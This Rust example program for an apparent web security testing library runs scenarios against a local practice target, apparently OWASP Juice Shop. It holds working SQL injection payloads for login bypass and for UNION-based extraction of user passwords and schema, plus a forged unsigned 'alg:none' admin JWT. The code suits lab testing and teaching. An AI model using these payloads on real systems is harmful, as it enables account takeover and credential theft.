//! Comprehensive Security Scenario Tests
//!
//! Run with: cargo run --example security_scenarios
//!
//! Requires a target application running at http://localhost:3000 (e.g., OWASP Juice Shop)

use rectitude::payloads::{jwt, sqli};
use rectitude::prelude::*;
use std::sync::Arc;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║           Rectitude Security Scenario Tests                  ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    let mut passed = 0;
    let mut failed = 0;

    // Scenario 1: SQL Injection Authentication Bypass
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    let result = run_sqli_auth_bypass().await?;
    if result.success {
        passed += 1;
    } else {
        failed += 1;
    }
    result.print_summary();

    // Scenario 2: SQL Injection Data Extraction
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    let result = run_sqli_data_extraction().await?;
    if result.success {
        passed += 1;
    } else {
        failed += 1;
    }
    result.print_summary();

    // Scenario 3: JWT Token Analysis
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    let result = run_jwt_analysis().await?;
    if result.success {
        passed += 1;
    } else {
        failed += 1;
    }
    result.print_summary();

    // Scenario 4: Security Headers Analysis
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    let result = run_security_headers().await?;
    if result.success {
        passed += 1;
    } else {
        failed += 1;
    }
    result.print_summary();

    // Scenario 5: API Endpoint Discovery
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    let result = run_api_discovery().await?;
    if result.success {
        passed += 1;
    } else {
        failed += 1;
    }
    result.print_summary();

    // Summary
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║                      Final Summary                           ║");
    println!("╠══════════════════════════════════════════════════════════════╣");
    println!(
        "║  Passed: {:2}                                                 ║",
        passed
    );
    println!(
        "║  Failed: {:2}                                                 ║",
        failed
    );
    println!(
        "║  Total:  {:2}                                                 ║",
        passed + failed
    );
    println!("╚══════════════════════════════════════════════════════════════╝");

    Ok(())
}

/// Scenario 1: SQL Injection Authentication Bypass
async fn run_sqli_auth_bypass() -> anyhow::Result<ScenarioResult> {
    Scenario::new("SQLi Authentication Bypass")
        .base_url("http://localhost:3000")
        .step(
            "Test multiple SQLi payloads",
            |ctx: Arc<ScenarioContext>| async move {
                let payloads = sqli::auth_bypass_payloads();
                let mut successful_payload = None;

                for payload in &payloads {
                    let _test_email =
                        format!("admin@juice-sh.op{}", payload.payload.replace("'", ""));

                    // Try the standard format first
                    let resp = ctx
                        .post("/rest/user/login")
                        .json(&serde_json::json!({
                            "email": format!("admin@juice-sh.op{}", payload.payload),
                            "password": "anything"
                        }))
                        .send()
                        .await?;

                    if resp.is_success() {
                        successful_payload = Some(payload.name.clone());

                        // Extract and store token
                        if let Ok(token) = resp.json_path("$.authentication.token") {
                            let token_str = token.to_string().trim_matches('"').to_string();
                            ctx.set_var_async("jwt_token", token_str).await;
                        }
                        break;
                    }
                }

                match successful_payload {
                    Some(name) => {
                        println!("  [+] Successful payload: {}", name);
                        Ok(StepResult::success_with_message(format!(
                            "Bypass with: {}",
                            name
                        )))
                    }
                    None => Ok(StepResult::failed("No SQLi payload succeeded")),
                }
            },
        )
        .step(
            "Verify admin access",
            |ctx: Arc<ScenarioContext>| async move {
                if !ctx.has_var("jwt_token").await {
                    return Ok(StepResult::skipped("No JWT token available"));
                }

                let token = ctx.get_var_async("jwt_token").await?;

                let resp = ctx
                    .get("/rest/admin/application-configuration")
                    .bearer_auth(&token)
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("  [+] Admin API accessible");
                    Ok(StepResult::success())
                } else {
                    println!("  [-] Admin API returned: {}", resp.status);
                    Ok(StepResult::failed("Admin access denied"))
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Scenario 2: SQL Injection Data Extraction
async fn run_sqli_data_extraction() -> anyhow::Result<ScenarioResult> {
    Scenario::new("SQLi Data Extraction")
        .base_url("http://localhost:3000")
        .step(
            "Discover column count",
            |ctx: Arc<ScenarioContext>| async move {
                let mut column_count = 0;

                for n in 1..=15 {
                    let columns = (1..=n).map(|i| i.to_string()).collect::<Vec<_>>().join(",");
                    let payload = format!("')) UNION SELECT {}--", columns);

                    let resp = ctx
                        .get("/rest/products/search")
                        .query("q", &payload)
                        .send()
                        .await?;

                    if resp.is_success() && !resp.text().contains("error") {
                        column_count = n;
                        break;
                    }
                }

                if column_count > 0 {
                    println!("  [+] Found {} columns", column_count);
                    ctx.set_var_async("column_count", column_count.to_string())
                        .await;
                    Ok(StepResult::success_with_message(format!(
                        "{} columns",
                        column_count
                    )))
                } else {
                    Ok(StepResult::failed("Could not determine column count"))
                }
            },
        )
        .step(
            "Extract user data",
            |ctx: Arc<ScenarioContext>| async move {
                let payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--";

                let resp = ctx
                    .get("/rest/products/search")
                    .query("q", payload)
                    .send()
                    .await?;

                if resp.is_success() {
                    let text = resp.text();

                    // Check if we got user data
                    if text.contains("@") && text.contains("juice-sh.op") {
                        println!("  [+] User data extracted successfully");

                        // Try to count users found
                        let user_count = text.matches("juice-sh.op").count();
                        println!("  [+] Found approximately {} users", user_count);

                        Ok(StepResult::success_with_message(format!(
                            "{} users found",
                            user_count
                        )))
                    } else {
                        Ok(StepResult::success_with_message(
                            "Query executed but no user data visible",
                        ))
                    }
                } else {
                    Ok(StepResult::failed("Extraction query failed"))
                }
            },
        )
        .step(
            "Extract schema information",
            |ctx: Arc<ScenarioContext>| async move {
                let payload =
                    "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--";

                let resp = ctx
                    .get("/rest/products/search")
                    .query("q", payload)
                    .send()
                    .await?;

                if resp.is_success() {
                    let text = resp.text();

                    if text.contains("CREATE TABLE") {
                        println!("  [+] Schema information extracted");

                        // Count tables found
                        let table_count = text.matches("CREATE TABLE").count();
                        println!("  [+] Found {} table definitions", table_count);

                        Ok(StepResult::success_with_message(format!(
                            "{} tables",
                            table_count
                        )))
                    } else {
                        Ok(StepResult::success_with_message("Query executed"))
                    }
                } else {
                    Ok(StepResult::failed("Schema extraction failed"))
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Scenario 3: JWT Token Analysis
async fn run_jwt_analysis() -> anyhow::Result<ScenarioResult> {
    Scenario::new("JWT Token Analysis")
        .base_url("http://localhost:3000")
        .step("Obtain valid JWT", |ctx: Arc<ScenarioContext>| async move {
            // Login with SQLi to get a token
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "admin@juice-sh.op'--",
                    "password": "x"
                }))
                .send()
                .await?;

            if resp.is_success() {
                if let Ok(token) = resp.json_path("$.authentication.token") {
                    let token_str = token.to_string().trim_matches('"').to_string();
                    ctx.set_var_async("original_jwt", token_str).await;
                    println!("  [+] JWT obtained");
                    Ok(StepResult::success())
                } else {
                    Ok(StepResult::failed("No token in response"))
                }
            } else {
                Ok(StepResult::failed("Login failed"))
            }
        })
        .step(
            "Analyze JWT structure",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("original_jwt").await?;

                match jwt::DecodedJwt::decode(&token) {
                    Ok(decoded) => {
                        let alg = decoded
                            .header
                            .get("alg")
                            .map(|v| v.to_string())
                            .unwrap_or_else(|| "unknown".to_string());

                        println!("  [+] Algorithm: {}", alg);

                        // Check for sensitive data in payload
                        let payload_str = decoded.payload.to_string();
                        if payload_str.contains("password") {
                            println!("  [!] WARNING: Password hash exposed in JWT");
                        }
                        if payload_str.contains("role") {
                            println!("  [+] Role information present");
                        }

                        ctx.set_var_async("jwt_algorithm", alg.trim_matches('"').to_string())
                            .await;
                        Ok(StepResult::success_with_message("JWT analyzed"))
                    }
                    Err(e) => Ok(StepResult::failed(format!("Decode error: {}", e))),
                }
            },
        )
        .step(
            "Test unsigned JWT (alg:none)",
            |ctx: Arc<ScenarioContext>| async move {
                // Create unsigned JWT with admin role
                let unsigned = jwt::create_unsigned(&serde_json::json!({
                    "status": "success",
                    "data": {
                        "id": 1,
                        "email": "admin@juice-sh.op",
                        "role": "admin"
                    }
                }));

                // Try using it
                let resp = ctx
                    .get("/rest/admin/application-configuration")
                    .bearer_auth(&unsigned)
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("  [!] VULNERABLE: Server accepts unsigned JWT!");
                    Ok(StepResult::success_with_message("alg:none ACCEPTED"))
                } else {
                    println!("  [+] Server rejects unsigned JWT (good)");
                    Ok(StepResult::success_with_message("alg:none rejected"))
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Scenario 4: Security Headers Analysis
async fn run_security_headers() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Security Headers Analysis")
        .base_url("http://localhost:3000")
        .step(
            "Check main page headers",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/").send().await?;

                let mut findings = Vec::new();

                // Critical headers
                let headers_to_check = [
                    ("strict-transport-security", "HSTS", true),
                    ("content-security-policy", "CSP", true),
                    ("x-content-type-options", "X-Content-Type-Options", false),
                    ("x-frame-options", "X-Frame-Options", false),
                    ("x-xss-protection", "X-XSS-Protection", false),
                    ("referrer-policy", "Referrer-Policy", false),
                    ("permissions-policy", "Permissions-Policy", false),
                ];

                for (header, name, critical) in headers_to_check {
                    match resp.header(header) {
                        Some(value) => {
                            println!("  [+] {}: {}", name, value);
                        }
                        None => {
                            let severity = if critical { "CRITICAL" } else { "INFO" };
                            println!("  [-] {} Missing {}: {}", severity, name, header);
                            findings.push(format!("Missing {}", name));
                        }
                    }
                }

                // Check for information disclosure
                if let Some(server) = resp.header("server") {
                    println!("  [!] Server header disclosed: {}", server);
                    findings.push("Server disclosure".to_string());
                }

                if let Some(powered) = resp.header("x-powered-by") {
                    println!("  [!] X-Powered-By disclosed: {}", powered);
                    findings.push("X-Powered-By disclosure".to_string());
                }

                // Check CORS
                if let Some(cors) = resp.header("access-control-allow-origin") {
                    if cors == "*" {
                        println!("  [!] Wildcard CORS: {}", cors);
                        findings.push("Wildcard CORS".to_string());
                    }
                }

                ctx.set_var_async("header_findings", findings.len().to_string())
                    .await;

                Ok(StepResult::success_with_message(format!(
                    "{} issues found",
                    findings.len()
                )))
            },
        )
        .step(
            "Check API endpoint headers",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/api/Products/1").send().await?;

                let content_type = resp.header("content-type").unwrap_or("not set");
                println!("  [+] API Content-Type: {}", content_type);

                // Check if JSON responses are properly typed
                if !content_type.contains("application/json") {
                    println!("  [!] API not returning proper JSON content type");
                }

                Ok(StepResult::success())
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Scenario 5: API Endpoint Discovery
async fn run_api_discovery() -> anyhow::Result<ScenarioResult> {
    Scenario::new("API Endpoint Discovery")
        .base_url("http://localhost:3000")
        .step(
            "Probe common API endpoints",
            |ctx: Arc<ScenarioContext>| async move {
                let endpoints = [
                    "/api/Products",
                    "/api/Users",
                    "/api/Feedbacks",
                    "/api/Complaints",
                    "/api/Recycles",
                    "/api/SecurityQuestions",
                    "/rest/products/search",
                    "/rest/user/whoami",
                    "/rest/admin/application-configuration",
                    "/rest/basket/1",
                ];

                let mut found = Vec::new();
                let mut protected = Vec::new();

                for endpoint in endpoints {
                    let resp = ctx.get(endpoint).send().await?;
                    let status = resp.status.as_u16();

                    match status {
                        200 => {
                            println!("  [+] {} - Accessible", endpoint);
                            found.push(endpoint);
                        }
                        401 | 403 => {
                            println!("  [~] {} - Protected ({})", endpoint, status);
                            protected.push(endpoint);
                        }
                        404 => {
                            // Not found, skip
                        }
                        _ => {
                            println!("  [?] {} - Status {}", endpoint, status);
                        }
                    }
                }

                println!(
                    "\n  Summary: {} accessible, {} protected",
                    found.len(),
                    protected.len()
                );

                ctx.set_var_async("found_endpoints", found.len().to_string())
                    .await;
                Ok(StepResult::success_with_message(format!(
                    "{} endpoints found",
                    found.len()
                )))
            },
        )
        .step(
            "Check for verbose errors",
            |ctx: Arc<ScenarioContext>| async move {
                // Try to trigger an error
                let resp = ctx.get("/api/Products/invalid").send().await?;

                let text = resp.text();

                if text.contains("stack") || text.contains("at ") || text.contains("node_modules") {
                    println!("  [!] Stack trace exposed in error response");
                    Ok(StepResult::success_with_message("Stack trace exposed"))
                } else if text.contains("error") {
                    println!("  [+] Error handling present but no stack trace");
                    Ok(StepResult::success())
                } else {
                    Ok(StepResult::success())
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}
